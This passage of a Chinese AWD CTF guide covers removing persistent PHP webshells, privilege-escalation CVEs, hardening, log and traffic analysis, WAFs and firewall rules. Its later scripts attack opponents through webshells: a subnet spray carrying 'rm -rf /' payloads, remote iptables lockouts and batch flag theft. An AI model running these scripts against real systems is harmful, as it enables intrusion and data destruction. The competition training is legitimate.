<span class="hljs-keyword">kill</span> -<span class="hljs-number">9</span><br></code></pre></td></tr></table></figure><p>原理</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs perl">ps aux<br>列出进程信息<br><br><span class="hljs-keyword">grep</span> www-data<br>在进程信息中找到需要杀死的进程<br><br><span class="hljs-keyword">grep</span> -v <span class="hljs-keyword">grep</span><br>在进程信息中剔除带<span class="hljs-keyword">grep</span>的信息<br><br>awk ‘&#123;<span class="hljs-keyword">print</span> $2&#125;’<br>提取字符串行内容的第<span class="hljs-number">2</span>个字段，也就是当前示例的进程号<br><br>xargs <span class="hljs-keyword">kill</span> -<span class="hljs-number">9</span><br>将进程号作为参数传递给<span class="hljs-keyword">kill</span> -<span class="hljs-number">9</span>这个命令<br></code></pre></td></tr></table></figure><p>然后删除不死马文件</p><p>(2)重启php等web服务，不推荐使用</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">service php-fpm restart</span><br></code></pre></td></tr></table></figure><p>(3)用一个ignore_user_abort(true)脚本，一直竞争写入（断断续续）。usleep要低于对方不死马设置的值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-variable">$pid</span>=<span class="hljs-number">1234</span>;  <span class="hljs-comment">#不死马进程</span><br>    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;demo.php&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;kill -9 $pid&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-literal">true</span>);<br>    <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;.3.php&#x27;</span>;<br>    <span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;hi springbird !&#x27;</span>;<br>    <span class="hljs-comment">//pass=pass</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$code</span>);<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .3.php&#x27;</span>);<br>    <span class="hljs-comment">//    usleep(5000);</span><br>          <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">1000</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>(4)创建一个和不死马生成的马一样名字的文件夹 mkdir 1.php<br>循环创建</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>dire=<span class="hljs-string">&quot;/var/www/html/.base.php/&quot;</span><br>file=<span class="hljs-string">&quot;/var/www/html/.base.php&quot;</span><br><span class="hljs-built_in">rm</span> -rf <span class="hljs-variable">$file</span><br><span class="hljs-built_in">mkdir</span> <span class="hljs-variable">$dire</span><br>./xx.sh<br></code></pre></td></tr></table></figure><h2 id="清除反弹shell"><a href="#清除反弹shell" class="headerlink" title="清除反弹shell"></a>清除反弹shell</h2><p>查看进程</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">ps -ef / px -<span class="hljs-built_in">aux</span><br></code></pre></td></tr></table></figure><p>出现www-data权限的&#x2F;bin&#x2F;sh一般为nc</p><p>然后杀进程</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">kill `<span class="hljs-keyword">ps</span> -aux | <span class="hljs-keyword">grep</span> www-data | <span class="hljs-keyword">grep</span> apache2 | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>`<br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在AWD中，一般都需要专门防御加固自己服务器的环节，但加固的很多操作都会涉及到root权限，如果直接给root权限最好，但一般只会给一个普通权限账号，这时候往往就需要给服务器提权了。</p><p>关于提权，通常我们要根据kernel版本号找到对应的poc，平时我们可以收集测试一些比较新的提权poc，以备不时之需。</p><p>影响范围比较大的漏洞，可以用来提权：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus">CVE-<span class="hljs-number">2017</span>-<span class="hljs-number">6074</span> (DCCP双重释放漏洞 &gt; <span class="hljs-number">2.6</span>.<span class="hljs-number">18</span> ) ：<br>DCCP双重释放漏洞可允许本地低权限用户修改Linux内核内存，导致拒绝服务(系统崩溃)或者提升权限，获得系统的管理访问权限<br><br><span class="hljs-function"><span class="hljs-title">CVE-2016-5195</span><span class="hljs-params">(脏牛，kernel <span class="hljs-number">2.6</span>.<span class="hljs-number">22</span> &lt; <span class="hljs-number">3.9</span> (x86/x64)</span></span>) ：<br>低权限用户可修改root用户创建的文件内容，如修改 /etc/passwd，把当前用户的 uid 改成 <span class="hljs-number">0</span> 即可提升为root权限<br><br><span class="hljs-function"><span class="hljs-title">CVE-2016-8655</span><span class="hljs-params">(Ubuntu <span class="hljs-number">12.04</span>、<span class="hljs-number">14.04</span>，Debian <span class="hljs-number">7</span>、<span class="hljs-number">8</span>)</span></span> ：<br>条件竞争漏洞，可以让低权限的进程获得内核代码执行权限<br>POC：https:<span class="hljs-comment">//www.seebug.org/vuldb/ssvid-92567</span><br><br><span class="hljs-function"><span class="hljs-title">CVE-2017-1000367</span><span class="hljs-params">(sudo本地提权漏洞 )</span></span> ：L<br>inux Kernel Stack Clash安全漏洞。该漏洞是由于操作系统内存管理中的一个堆栈冲突漏洞，它影响Linux，FreeBSD和OpenBSD，NetBSD，Solaris，i386和AMD64，攻击者可以利用它破坏内存并执行任意代码 。<br><br><span class="hljs-function"><span class="hljs-title">CVE-2016-1247</span><span class="hljs-params">(Nginx权限提升漏洞)</span></span> ：<br>Nginx服务在创建log目录时使用了不安全的权限设置，可造成本地权限提升，恶意攻击者能够借此实现从 nginx/web 的用户权限 www-data 到 root 用户权限的提升。<br>POC：https:<span class="hljs-comment">//legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html</span><br></code></pre></td></tr></table></figure><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>基本原则</p><ul><li>能修复的尽量修复；</li><li>不能修复的先注释源码，不影响页面显示再删除；</li><li>站点和对应的功能尽可能不宕机；</li></ul><p>技巧</p><ul><li>设置 waf，如 load_file；</li><li>对于一些成型的 CMS，找到相应版本号后，对其 diff；</li><li>修改弱口令用户；</li><li>对于觉得危险函数的地方直接使用die()；</li></ul><p>比如文件上传漏洞修复，可以在upload目录下写.htaccess禁止php文件执行</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">&lt;Directory <span class="hljs-string">&quot;/var/www/html/upload&quot;</span>&gt;<br>Options -ExecCGI -Indexes<br>AllowOverride None<br>RemoveHandler <span class="hljs-string">.php</span> <span class="hljs-string">.phtml</span> <span class="hljs-string">.php3</span> <span class="hljs-string">.pht</span> <span class="hljs-string">.php4</span> <span class="hljs-string">.php5</span> <span class="hljs-string">.php7</span> <span class="hljs-string">.shtml</span><br>RemoveType <span class="hljs-string">.php</span> <span class="hljs-string">.phtml</span> <span class="hljs-string">.php3</span> <span class="hljs-string">.pht</span> <span class="hljs-string">.php4</span> <span class="hljs-string">.php5</span> <span class="hljs-string">.php7</span> <span class="hljs-string">.shtml</span><br>php_flag engine off<br>&lt;FilesMatch <span class="hljs-string">&quot;.+\.ph(p[3457]?|t|tml)$&quot;</span>&gt;<br>deny from all<br>&lt;<span class="hljs-string">/FilesMatch</span>&gt;<br>&lt;<span class="hljs-string">/Directory</span>&gt;<br></code></pre></td></tr></table></figure><p>一些修复技巧参考：<a href="https://qftm.github.io/2019/08/03/AWD-Bugs-Fix/">https://qftm.github.io/2019/08/03/AWD-Bugs-Fix/</a></p><h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><p>命令行动态查看日志</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">tailf /<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/apache2/access.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure><p>还可以使用工具进行日志分析：<a href="https://security.tencent.com/index.php/opensource/detail/15">LogForensics 腾讯实验室 &#x2F;web日志取证分析工具</a></p><p>日志的存放地址</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/apache2/</span><br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/apache2/</span>logs<br><span class="hljs-regexp">/usr/</span>nginx<span class="hljs-regexp">/logs/</span><br></code></pre></td></tr></table></figure><p>为了对其他防守方进行干扰，可以利用脚本发生大量垃圾数据包，混淆视觉，给对方人员增加检测的难度，浪费对方的时间。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_attack</span>():<br>    file=&#123;<span class="hljs-string">&#x27;shell.php&#x27;</span>,<span class="hljs-string">&#x27;admin.php&#x27;</span>,<span class="hljs-string">&#x27;web.php&#x27;</span>,<span class="hljs-string">&#x27;login.php&#x27;</span>,<span class="hljs-string">&#x27;1.php&#x27;</span>,<span class="hljs-string">&#x27;index.php&#x27;</span>&#125;<br>    payload=&#123;<span class="hljs-string">&#x27;cat /flag&#x27;</span>,<span class="hljs-string">&#x27;ls -al&#x27;</span>,<span class="hljs-string">&#x27;rm -f&#x27;</span>,<span class="hljs-string">&#x27;echo 1&#x27;</span>,<span class="hljs-string">&#x27;echo 1 /proc/sys/net/ipv4/ip_forward&#x27;</span>,<span class="hljs-string">&#x27;rm -rf / --no-preserve-root&#x27;</span>&#125;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):<br>            <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> file:<br>                url=<span class="hljs-string">&#x27;http://192.168.182.&#x27;</span>+ <span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;/&#x27;</span>+ii<br>                <span class="hljs-built_in">print</span>(url)<br>                <span class="hljs-keyword">for</span> iii <span class="hljs-keyword">in</span> payload:<br>                    data=&#123;<br>                        <span class="hljs-string">&#x27;payload&#x27;</span>:iii<br>                    &#125;<br>                    <span class="hljs-keyword">try</span>:<br>                        requests.post(url,data=data)<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正在搅屎:&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;|&#x27;</span>+ii+<span class="hljs-string">&#x27;|&#x27;</span>+iii)<br>                        time.sleep(<span class="hljs-number">0.1</span>)<br>                    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                        time.sleep(<span class="hljs-number">0.1</span>)<br>                        <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    scan_attack()<br></code></pre></td></tr></table></figure><h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><p>在比赛服务器上抓取流量包，需要的权限比较高，一般比赛用不到</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs tap">sudo tcpdump -s<span class="hljs-number"> 0 </span>-w flow.pcap port 80<br><span class="hljs-comment"># 然后使用 scp 写个脚本实时将流量包拷贝到本地</span><br><br><br>tcpdump tcp -i eth1 -t -s<span class="hljs-number"> 0 </span>-c<span class="hljs-number"> 100 </span>and dst port !<span class="hljs-number"> 22 </span>and src net 192.168.1.0/24 -w ./target.cap<br>命令拆解分析：<br>1、tcp: ip icmp arp rarp 和 tcp、udp、icmp这些选项等都要放到第一个参数的位置，用来过滤数据报的类型<br>2、-i eth1 : 只抓经过接口eth1的包<br>3、-t : 不显示时间戳<br>4、-s<span class="hljs-number"> 0 </span>: 抓取数据包时默认抓取长度为68字节。加上-S<span class="hljs-number"> 0 </span>后可以抓到完整的数据包<br>5、-c<span class="hljs-number"> 100 </span>: 只抓取100个数据包<br>6、dst port !<span class="hljs-number"> 22 </span>: 不抓取目标端口是22的数据包<br>7、src net 192.168.1.0/24 : 数据包的源网络地址为192.168.1.0/24<br>8、-w ./target.cap : 保存成cap文件，方便用wireshark分析<br></code></pre></td></tr></table></figure><p>PHP版流量监控</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>  <span class="hljs-title function_ invoke__">date_default_timezone_set</span>(<span class="hljs-string">&#x27;Asia/Shanghai&#x27;</span>);<br><br><span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]; <span class="hljs-comment">//记录访问者的ip</span><br><br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]; <span class="hljs-comment">//访问者要访问的文件名</span><br><br><span class="hljs-variable">$parameter</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;QUERY_STRING&quot;</span>]; <span class="hljs-comment">//访问者要请求的参数</span><br><br><span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Y-m-d H:i:s&#x27;</span>,<span class="hljs-title function_ invoke__">time</span>()); <span class="hljs-comment">//访问时间</span><br><br><span class="hljs-variable">$logadd</span> = <span class="hljs-string">&#x27;来访时间：&#x27;</span>.<span class="hljs-variable">$time</span>.<span class="hljs-string">&#x27;--&gt;&#x27;</span>.<span class="hljs-string">&#x27;访问链接：&#x27;</span>.<span class="hljs-string">&#x27;http://&#x27;</span>.<span class="hljs-variable">$ip</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&#x27;?&#x27;</span>.<span class="hljs-variable">$parameter</span>.<span class="hljs-string">&quot;\r\n&quot;</span>;<br><br><span class="hljs-comment">// log记录</span><br><br><span class="hljs-variable">$fh</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;log.txt&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br><br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fh</span>, <span class="hljs-variable">$logadd</span>);<br><br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fh</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>一个针对php的web流量抓取、分析的应用：<a href="https://github.com/wupco">wupco</a>&#x2F;<a href="https://github.com/wupco/weblogger">weblogger</a><br>使用方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /var/www/html/ (or other web <span class="hljs-built_in">dir</span>)<br><br>   git <span class="hljs-built_in">clone</span> https://github.com/wupco/weblogger.git<br><br>   <span class="hljs-built_in">chmod</span> -R 777 weblogger/<br><br>   open http://xxxxx/weblogger/install.php <span class="hljs-keyword">in</span> Web browser<br><br>   install it<br></code></pre></td></tr></table></figure><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><p>waf的作用：<br>1.最重要是分析流量，别人攻击我们的时候，我们可以看到别人的攻击方式。这样的话即使我们找 不到攻击点，非常苦恼的时候，我们就可以分析流量，使用别人的攻击方式。<br>2.可以直接进行防御，类似于一台防火墙（一般的比赛是不允许使用的，毕竟比赛时间短，就根本绕不过去waf，那比赛就没意思了）</p><p>有些比赛是不允许上通用waf的，check机制可能会check到waf过滤的参数，导致宕机，waf部署需要谨慎，还需要注意的是：上完waf检查服务是否可用，部分检查允许使用部分小的waf，会检查页面完整性、服务完整性。</p><p>常用的waf使用方法，是用你要保护的文件去包含这个waf.php。比如说，你要保护select.php，那么你就在select.php里面写上一行include ‘.&#x2F;waf.php’或者 require_once(‘waf.php’);<br>如果你要保护所有文件，那么就在config这种配置文件里包含waf，因为这种config的文件，一般会被大部分功能页面调用</p><p>网上很多waf脚本，这里介绍几个waf项目</p><p><strong>1.AWD_PHP_WAF</strong><br>项目地址：<a href="https://github.com/NonupleBroken/AWD_PHP_WAF">https://github.com/NonupleBroken/AWD_PHP_WAF</a></p><p>使用方法：<br>使用前先修改config.php内的密码，密码使用sha256加密</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lua">上waf：<br>$ <span class="hljs-built_in">find</span> . -<span class="hljs-built_in">path</span> ./waffffff -prune -o -<span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;*.php&quot;</span> -<span class="hljs-built_in">print</span> | xargs sed -i <span class="hljs-string">&quot;s/&lt;?php/&lt;?php include_once(\&quot;\/var\/www\/html\/waffffff\/waf.php\&quot;);/g&quot;</span><br><br>下waf：<br>$ <span class="hljs-built_in">find</span> . -<span class="hljs-built_in">path</span> ./waffffff -prune -o -<span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;*.php&quot;</span> -<span class="hljs-built_in">print</span> | xargs sed -i <span class="hljs-string">&quot;s/&lt;?php include_once(\&quot;\/var\/www\/html\/waffffff\/waf.php\&quot;);/&lt;?php/g&quot;</span><br></code></pre></td></tr></table></figure><p>比如访问 web 目录下的&#x2F;waffffff&#x2F;admin.php?password&#x3D;123456</p><p><strong>2.CTF-WAF</strong><br>项目地址：<a href="https://github.com/sharpleung/CTF-WAF">https://github.com/sharpleung/CTF-WAF</a></p><p><strong>3.awd-watchbird</strong><br>这是个通防waf，支持流量转发和替换flag<br>项目地址：<a href="https://github.com/leohearts/awd-watchbird">https://github.com/leohearts/awd-watchbird</a></p><p>1.打包好好之后直接上传到html目录下，回到终端，在上传的waf目录下，使用命令</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">php watchbird<span class="hljs-selector-class">.php</span> <span class="hljs-attr">--install</span> /<span class="hljs-selector-tag">var</span>/www/<span class="hljs-selector-tag">html</span><br></code></pre></td></tr></table></figure><p>这样就能使每个页面的php代码包含到waf下</p><p>2.运行waf 之后，打开我们的web 页面，在任意一个php 页面后面输入?watchbird&#x3D;ui，就会进入到waf 配置页面然后设置密码(注意：第一次打开需要设置密码)</p><p>3.配置好之后就能进入内部网页</p><p><strong>4.AoiAWD</strong><br>项目地址：<a href="https://github.com/DasSecurity-HatLab/AoiAWD">https://github.com/DasSecurity-HatLab/AoiAWD</a></p><p>使用方法：<a href="https://www.wlhhlc.top/posts/16692/">AoiAWD-萌新的得分利器</a><br>下载好，自己去编译或者找编译好的直接用</p><h2 id="防御搅屎"><a href="#防御搅屎" class="headerlink" title="防御搅屎"></a>防御搅屎</h2><p>在加固阶段，每个堡垒机都有一个Web在运行。而这些站点可能存在相应的漏洞和后门。基本上都会有shell留在隐秘的角落…</p><p>所以我们就可以通过前期搜寻到的后门，进行操作。这里直接用linux的防火墙进行关闭即可。</p><p>在正常情况下：这样的话就直接把系统的后门全杀掉了。只允许22 80 21端口可以进行访问。</p><p>首先开启 22 80 21</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">iptables -<span class="hljs-selector-tag">A</span> <span class="hljs-selector-tag">INPUT</span> -<span class="hljs-selector-tag">p</span> tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">80</span> -j ACCEPT<br>iptables -<span class="hljs-selector-tag">A</span> <span class="hljs-selector-tag">INPUT</span> -<span class="hljs-selector-tag">p</span> tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">22</span> -j ACCEPT<br>iptables -<span class="hljs-selector-tag">A</span> <span class="hljs-selector-tag">INPUT</span> -<span class="hljs-selector-tag">p</span> tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">21</span> -j ACCEPT<br></code></pre></td></tr></table></figure><p>然后关闭</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">iptables -<span class="hljs-selector-tag">A</span> <span class="hljs-selector-tag">INPUT</span> -j DROP<br></code></pre></td></tr></table></figure><p>在手动一个个连shell搅shi的话，是非常慢的。于是写了个小脚本。</p><p>遍历整个IP段，并将防火墙开启全部屏蔽掉~~</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br>url = <span class="hljs-string">&quot;http://192.168.182&quot;</span><br><span class="hljs-attribute">port</span>=<span class="hljs-string">&#x27;80&#x27;</span><br>shell = <span class="hljs-string">&quot;/shell.php&quot;</span><br>passwd = <span class="hljs-string">&quot;a&quot;</span><br>payloads = &#123;<br>    passwd:<span class="hljs-string">&quot;system(\&#x27;iptables -A INPUT -j DROP&#x27;);&quot;</span><br>&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,254):<br>    urls = url+<span class="hljs-string">&quot;.&quot;</span>+str(i)+<span class="hljs-string">&quot;:&quot;</span>+port+shell<br>    <span class="hljs-built_in">print</span>(urls+<span class="hljs-string">&quot;\n&quot;</span>)<br>    try:<br>        res = requests.post(urls,payloads,<span class="hljs-attribute">timeout</span>=1)<br>        <span class="hljs-built_in">print</span>(res.text)<br>    except:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;未找到主机&quot;</span>)<br></code></pre></td></tr></table></figure><h1 id="编写批量脚本"><a href="#编写批量脚本" class="headerlink" title="编写批量脚本"></a>编写批量脚本</h1><p>以下脚本来自于我比赛时写的垃圾脚本，大佬勿喷。</p><h3 id="1-利用后门getflag"><a href="#1-利用后门getflag" class="headerlink" title="1.利用后门getflag"></a>1.利用后门getflag</h3><p>单个shell获取flag</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br><br><span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;http://192.168.182.130/include/shell.php&quot;</span><br><span class="hljs-attribute">passwd</span>=<span class="hljs-string">&quot;admin_ccmd&quot;</span><br>payload = &#123;passwd: <span class="hljs-string">&#x27;system(\&#x27;</span>cat /f*\<span class="hljs-string">&#x27;);&#x27;</span>&#125;<br><span class="hljs-attribute">res</span>=requests.post(url,payload)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><h3 id="2-后门批量getflag"><a href="#2-后门批量getflag" class="headerlink" title="2.后门批量getflag"></a>2.后门批量getflag</h3><p>针对端口变化利用后门批量获取flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url1=<span class="hljs-string">&quot;http://192.168.182.130:&quot;</span><br>url2=<span class="hljs-string">&quot;&quot;</span><br><br>flaglist=[]<br><br>path=<span class="hljs-string">&quot;/include/shell.php&quot;</span><br>passwd=<span class="hljs-string">&quot;admin_ccmd&quot;</span><br><br><br><span class="hljs-comment">#payload = &#123;passwd: &#x27;system(\&#x27;cat /f*\&#x27;);&#x27;&#125;</span><br>payload = &#123;passwd: <span class="hljs-string">&#x27;system(\&#x27;cat /flag\&#x27;);&#x27;</span>&#125;<br><br>i = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">for</span> url2 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8801</span>,<span class="hljs-number">8805</span>):<br>    url = url1 + <span class="hljs-built_in">str</span>(url2) +path<br><br>    res=requests.post(url,payload)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(url1 + <span class="hljs-built_in">str</span>(url2),res.text)<br>        <span class="hljs-comment"># flag存入列表中</span><br>        flaglist.append(<span class="hljs-built_in">str</span>(res.text))<br>        <span class="hljs-comment">#print(flaglist[i])</span><br>        i += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><h3 id="3-利用后门批量getflag并提交"><a href="#3-利用后门批量getflag并提交" class="headerlink" 